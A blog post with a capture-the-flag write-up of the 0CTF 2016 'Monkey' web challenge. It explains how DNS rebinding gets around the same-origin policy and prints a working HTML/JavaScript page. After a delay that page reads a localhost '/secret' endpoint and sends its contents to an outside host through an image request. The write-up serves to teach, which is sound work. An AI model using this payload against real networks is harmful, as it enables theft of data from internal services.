---
layout: post
title: "CTF WriteUp: 0CTF/Monkey"
category: CTF
comments: true
---

CTF WriteUp: 0CTF 2016 / Monkey / web / 4 points

We are presented with a simple page that allows us to submit a URL which some monkey will browse for two minutes. In addition, the page says that we can find the flag at `127.0.0.1:8080/secret`. The challenge page also asks what the same-origin policy is. Let's start by answering that question.

 <!-- more -->

## Intro

The [same-origin policy](https://en.wikipedia.org/wiki/Same-origin_policy) regulates that scripts shall only be allowed to access or request data from the origin from which they were loaded. An origin is defined by the URI scheme, the hostname and port.

As such, if we load our page from `http://foo.dollberg.xyz:8080` we are not allowed to do an XHR request to `http://127.0.0.1:8080` because the hostname is different.

The task of the challenge is now to circumvent this policy. While there exist several possibilities to circumvent the same-origin policy, such as explicitly allowing it using [CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing), most of them require active help from the target domain.

My initial idea was to load the page via an image and then extract the data via html canvas elements. Second, was to load the flag page in an iframe and try to access it via some hacks of the `document.domain` property. However, both of those failed.

At that point, two things came to my mind. First, I got suspicious of the hint which mentioned that the monkey will surf for two minutes on the page. Second, I remembered attacks on smart home devices in local home networks that used DNS to circumvent the same-origin policy. At this point, I was totally sure that this must be the way to solve it.

Specifically, the attack works like this. The victim browses a page that you control (e.g.: `foo.dollberg.xyz`, the page which we submit). This page contains some javascript that accesses the endpoint of the flag (`/secret`) after a certain amount time (110 seconds). If the DNS entry of `foo.dollberg.xyz` has a very short TTL (60 seconds), the delayed request has to do an additional DNS request. However, by changing the DNS record in the meantime, the domain will resolve to the victim page (`127.0.0.1`).

There is only one last hurdle before we can make this happen. I use Cloudflare as a DNS provider for this page/domain. Unfortunately, Cloudflare only supports TTLs of two minutes. As a consequence, we first have to submit a different dummy link and wait some time so that the DNS record gets cached. The final procedure looks like this.

## Let's Pwn

We create a DNS record for `foo.dollberg.xyz` with the IP of our server (e.g.: `1.2.3.4`):

![My helpful screenshot](/resources/0ops16_monkey_realip.png)


After that, we submit the dummy URL `http://foo.dollberg.xyz:8080/dummy`. This causes the DNS query and the caching of the real IP. Then, we change the DNS record to point to localhost.

![My helpful screenshot](/resources/0ops16_monkey_localhost.png)

Now, we wait for a small amount of time, e.g.: 30 seconds. Then we submit a second link that contains our webpage `http://foo.dollberg.xyz:8080/pwn.html`:

    <html>
    <head>
    <script src="jquery.min.js"></script> <!-- can't access maxcdn in China -->
    <script type="text/javascript">

    function pwn() {
        $.get('/secret', function(data) {
            var image = new Image();
            image.src='http://someotherdomainorip:8080?data='+data;
        });
    }

    function foo() {
        setTimeout(pwn, 110 * 1000);
    }

    </script>
    </head>
    <body onload="foo()">
    </body>
    </html>

As the DNS record for `foo.dollberg.xyz` is still cached it is loaded from the correct server and the page is being browsed for another 120 seconds. After 110 seconds the timeout fires. As the TTL has expired an additional DNS request is being made which resolves to `127.0.0.1`. As a result, the request successfully accesses the `/secret` page of `127.0.0.1:8080`. Finally, we use an image tag to send the flag/data to another IP/domain of ours:

    0ctf{monkey_likes_banananananananaaaa}

For a change, this was a really cool web challenge and not the usual PHP crap. In the meantime, I have learned from other write-ups that the attack is generally known as [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding).
